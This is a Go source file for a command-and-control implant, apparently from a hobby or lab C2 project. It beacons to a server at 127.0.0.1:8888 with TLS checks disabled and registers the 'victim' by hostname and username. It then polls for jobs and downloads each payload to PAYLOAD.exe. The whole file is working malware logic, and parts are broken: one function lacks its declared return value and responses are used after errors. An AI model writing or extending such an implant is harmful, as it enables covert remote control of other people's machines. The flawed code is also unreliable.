package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/user"
	"time"

	"github.com/google/uuid"
)

var AuthorizationToken string
var AuthorizationTokenExpire string
var JobsQueue []string

func AGENT() {
	JobsQueue = make([]string, 0)
Start:
	for {
		for {
			serverOk := CHECKCONNECTION()
			if serverOk {
				break
			} else {
				time.Sleep(time.Second * 3)
			}
		}
		for {
			connectedOk := TRYTOCONNECT()
			if connectedOk {
				break
			} else {
				time.Sleep(time.Second * 5)
			}
		}
		for {
			gotJobsOk := CHECKJOBS()
			if gotJobsOk {
				DOJOBS()
				break
			} else {
				time.Sleep(time.Second * 5)
			}
		}

	}
}

func CHECKCONNECTION() bool {
	conn, err := net.Dial("tcp", "127.0.0.1:8888")
	if err != nil {
		fmt.Println(fmt.Errorf("can't connect to a C2: %v", err))
		return false
	}
	defer conn.Close()
	return true
}

func TRYTOCONNECT() bool {
	id := uuid.New()
	uuid := id.String()
	hostname := GETHOSTNAME()
	username := GETUSERNAME()
	connectPostBody := map[string]string{"uuid": uuid, "hostname": hostname, "username": username}
	connectPostJson, err := json.Marshal(connectPostBody)
	if err != nil {
		fmt.Println(fmt.Errorf("can't marshal a json for POST login: %v", err))
		return false
	}
	req, err := http.NewRequest("POST", "https://127.0.0.1:8888/connect", bytes.NewBuffer(connectPostJson))
	if err != nil {
		fmt.Println(fmt.Errorf("can't create a POST request: %v", err))
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))
		return false
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
		return false
	}
	var respJson struct {
		Code   int    `json:"code"`
		Expire string `json:"expire"`
		Token  string `json:"token"`
	}
	err = json.Unmarshal(respBody, &respJson)
	if err != nil {
		fmt.Println(fmt.Errorf("can't unmarshal a JSON in response: %v", err))
		return false
	}
	if respJson.Code == 200 {
		AuthorizationToken = respJson.Token
		AuthorizationTokenExpire = respJson.Expire
		return true
	} else {
		fmt.Println(fmt.Errorf("can't login with this credentials: %v, %v", respJson.Code, err))
		return false
	}
}

func GETHOSTNAME() string {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(fmt.Errorf("can't get hostname of a victim: %v", err))
	}
	return hostname
}

func GETUSERNAME() string {
	user, err := user.Current()
	if err != nil {
		fmt.Println(fmt.Errorf("can't get a username on a victim: %v", err))
	}
	return user.Username
}

func CHECKJOBS() bool {
	req, err := http.NewRequest("GET", "https://127.0.0.1:8888/agent/jobs", nil)
	if err != nil {
		fmt.Println(fmt.Errorf("can't create a new request: %v", err))
		return false
	}
	req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))
		return false
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
		return false
	}
	var respJson []string
	err = json.Unmarshal(respBody, &respJson)
	if err != nil {
		fmt.Println(fmt.Errorf("can't unmarshal a JSON in response: %v", err))
		return false
	}
	if len(respJson) == 0 {
		return false
	} else {
		JobsQueue = append(JobsQueue, respJson...)
		return true
	}
}

func DOJOBS() bool {
	for _, job := range JobsQueue {
		req, err := http.NewRequest("GET", "https://127.0.0.1:8888/agent/payload/"+job, nil)
		if err != nil {
			fmt.Println(fmt.Errorf("can't create a new request: %v", err))
		}
		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))

		}
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
		}
		err = WRITETOFILE("PAYLOAD.exe", string(respBody))
		if err != nil {
			fmt.Println(fmt.Errorf("can't write to a file: %v", err))
		} else {
		}

	}
}

func WRITETOFILE(filename string, data string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("can't create a file %s: %v", filename, err)
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return fmt.Errorf("can't write to a file %s: %v", filename, err)
	}
	return file.Sync()
}

func main() {
	AGENT()
}
